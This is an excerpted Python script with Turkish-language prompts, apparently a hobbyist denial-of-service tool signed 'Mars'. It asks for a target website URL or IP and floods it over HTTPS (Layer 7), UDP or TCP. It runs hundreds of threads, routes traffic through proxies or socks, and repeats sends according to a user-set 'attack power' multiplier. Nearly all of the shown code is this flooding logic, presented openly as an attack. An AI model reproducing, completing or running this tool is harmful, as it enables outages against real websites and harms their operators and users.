...
try:
      from scapy.all import *
         ...
         print ("\033[1;33m TCP/UDP ŞUANLIK KULLANILMMIYOR AMA HTTPS AKTİF. / TÜM HAKLARI KULLANICIYA AİTTİR ")

print ('''\033[1;35m 


 ____    ____       _       _______     ______    _____          _     ____  ____  ________  _______      _______  
|_   \  /   _|     / \     |_   __ \  .' ____ \  |_   _|        / \   |_  _||_  _||_   __  ||_   __ \    |  ___  | 
  |   \/   |      / _ \      | |__) | | (___ \_|   | |         / _ \    \ \  / /    | |_ \_|  | |__) |   |_/  / /  
  | |\  /| |     / ___ \     |  __ /   _.____`.    | |   _    / ___ \    \ \/ /     |  _| _   |  __ /        / /   
 _| |_\/_| |_  _/ /   \ \_  _| |  \ \_| \____) |  _| |__/ | _/ /   \ \_  _|  |_    _| |__/ | _| |  \ \_     / /    
|_____||_____||____| |____||____| |___|\______.' |________||____| |____||______|  |________||____| |___|   /_/     
''')
...
def slowprint(s):
    for c in s + '\n' :
        ...
        sys.stdout.flush()
        time.sleep(10. / 100)
slowprint("\033[1;33m [+] Başlatılıyor : ")
time.sleep(5)
os.system('clear')
...
\033[1;34m Created By Mars \033[1;32m Version V1.0
...
def starturl():
        ...
        url = input("\033[1;33m WEB SİTE URL / İPSİ :   ")

        if url == "":
                print ("\033[1;31m LÜTFEN SİTE URL / İP GİRİNİZ")
                starturl()
        try:
             if url[0]+url[1]+url[2]+url[3] == "www.":
                ...
                print ("\033[1;31m Hatalı Tekrar Deneyin.")
                starturl()
        try:
...
def floodmode():
        global choice1
        choice1 = input("\033[1;34m HTTPS SALDIRI İÇİN '0' UDP SALDIRI İÇİN '1' TCP SALDIRI İÇİN '2' ? : ")
        if choice1 == "0":
                proxymode()
        elif choice1 == "1":
                try:
                      if os.getuid() != 0:
                              print ("\033[1;31m BUNUN İÇİN ROOT İZİNLERİ GEREKİYOR.")
                              exit(0)
                      else:
                              floodport()
                except:
                ...
                print ("\033[1;31m HATALI TEKRAR DENE.")
                floodmode()

def floodport():
        global port
        try:
               port = int(input("\033[1;33m FLOOD ATMAK İSTEDİĞİN PORTU GİR : "))
...
def proxymode():
	global choice2
	choice2 = input("\033[1;33m Proxy Veya Soket Modu Aktiflessinmi? evetse 'Y' Hayirsa 'H': ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
        global choice3
        choice3 = input("\033[1;33m 0 Proxy Modu / 1 Soket Modu : ")
        if choice3 == "0":
           choicedownproxy()
        elif choice3 == "1":
                choicedownproxy()
...
def numthreads():
	global threads
	try:
		threads = int(input("\033[1;33m Kaç thread Olsun ? Yazmak İstemessen 'ENTER' Bas (800): "))
	except ValueError:
		threads = 800
		print ("\033[1;35m 800 threads Seçildi.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("\033[1;33m Saldırı Gücünü Ayarla [(1-5=normal)(50=Dengeli)(100=Ultra)]: "))
	except ValueError:
		print("\033[1;31m HATALI Tekrar Dene.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("\033[1;31m 'ENTER' A BAS SALDIRI BASLASIN [LAYER 7] : ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": 
		loop()
		...
		if choice2 == "y":  
			if choice3 == "0": 
				for x in range(threads):
					...
					print ("\033[1;31m Thread  " + str(x) + "\033[34m  Hazır!")
				go.set() 
			else: 
				for x in range(threads):
	...
	def run(self):
		...
		while True:
			try:
				...
				s.send(p) 
				print ("\033[1;32m Paket Yollanıyor " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try: 
		...
		while True:
			try:
				...
				try:
					...
					s.connect((str(url2),int(port)))
					s.send(p)
					print ("\033[1;32m Paket Yollaniyor " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
					try: 
						for y in range(multiple):
							s.send(str.encode(p))
					except:
					...
					print ("Sock Bitti, Yeniden  request. @", self.counter)
					s.close()
	...
	def run(self):
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port)))
				s.send(p)
				print ("Request Gönderildi! @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(p))
				except:
	...
	def run(self):
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port)))
				s.send(p)
				print ("\033[1;31m SALDIRI YÖNLENDİRİLİYOR " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple): 
						s.send(str.encode(p))
				except:
	...
	def run(self):
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port)))
				s.send(p)
				print ("\033[1;31m Proxyler Yönlendiriliyor " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(p))
				except:
				...
				try:
					...
					print ("\033[31m Bu Proxy Kullanılmıyor @", self.counter)
					s.close() 
	...
	def run(self):
		...
		while True:
			try:
				...
				print ("Proxyler Yönlendiriliyor  " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
	...
	def run(self):
		...
		while True:
			try:
				...
				s.send (str.encode(request))
				print ("\033[34m Proxy Yönlendiriliyor! " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
				...
				try:
					...
					print ("\033[31m Proxy Kullanilmiyor. @", self.counter)
					s.close()
	...
	def run(self):
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request)) 
				print ("\033[32m Soket Yönlendiriliyor! @", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
